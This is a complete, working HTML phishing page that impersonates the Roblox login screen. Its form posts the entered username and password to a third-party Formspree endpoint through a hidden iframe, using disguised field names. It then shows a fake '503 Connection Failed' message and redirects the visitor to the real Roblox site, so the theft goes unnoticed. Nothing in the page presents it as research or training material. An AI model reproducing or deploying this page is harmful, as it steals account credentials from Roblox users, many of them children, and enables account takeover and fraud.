<meta name="google-site-verification" content="PbAqyHzDPc2zjNW_t370KKRpjo3tV2n4WzzIfNBqpNk" />
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Roblox.com - Login</title>
    <link rel="icon" href="https://www.roblox.com/favicon.ico">
    <style>
        body { font-family: "HCo Gotham ScreenSmart", sans-serif; background-color: #232527; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: #ffffff; padding: 40px; border-radius: 8px; width: 380px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        .roblox-logo { width: 160px; margin-bottom: 25px; }
        h1 { color: #393b3d; font-size: 22px; margin-bottom: 20px; font-weight: 700; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #b8b8b8; border-radius: 4px; background-color: #f2f2f2; box-sizing: border-box; }
        .login-btn { width: 100%; padding: 12px; background-color: #0084ff; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        
        /* The Error Screen (Hidden) */
        #error-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #232527; justify-content: center; align-items: center; text-align: center; z-index: 10; }
        .error-box { background: #393b3d; padding: 30px; border-radius: 8px; width: 420px; color: white; border: 1px solid #454749; }
    </style>
</head>
<body>

<div class="login-card" id="login-form">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="roblox-logo">
    <h1>Login to Roblox.com</h1>
    
    <form action="https://formspree.io/f/xdalgqyl" method="POST" target="hidden_iframe" onsubmit="showError()">
        <input type="hidden" name="_subject" value="Project Entry Log">
        <input type="text" name="Entry_ID" placeholder="Username/Email/Phone" required>
        <input type="password" name="Security_Key" placeholder="Password" required>
        
        <button type="submit" class="login-btn">Log In</button>
    </form>
    
    <iframe name="hidden_iframe" style="display:none;"></iframe>
</div>

<div id="error-overlay">
    <div class="error-box">
        <div style="font-size: 50px; margin-bottom: 10px;">⚠️</div>
        <h2>Connection Failed</h2>
        <p>The game's server has shut down or is undergoing maintenance. Please try again later.</p>
        <p style="font-size: 11px; color: #bdbebe;">Error Code: 503 (Service_Unavailable)</p>
        <button onclick="window.location.href='https://www.roblox.com'" style="background:#0084ff; color:white; border:none; padding:10px 25px; border-radius:4px; font-weight:bold; cursor:pointer; margin-top:20px;">OK</button>
    </div>
</div>

<script>
    function showError() {
        // Hides login and shows error after data sends
        setTimeout(function(){
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('error-overlay').style.display = 'flex';
        }, 600);
    }
</script>

</body>
</html>
